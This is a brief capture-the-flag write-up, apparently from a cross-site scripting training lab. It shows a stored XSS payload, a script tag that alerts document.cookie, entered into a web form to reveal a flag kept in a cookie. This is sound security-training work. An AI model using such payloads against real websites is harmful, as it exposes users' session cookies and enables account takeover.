## Challenge

To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. 

## Solution

In the field provided by the webpage, I've put:

```js
<script>alert(document.cookie)</script>
```

which provided the cookie `cookie=HTB{570r3d_f0r_3v3ry0n3_70_533}`.

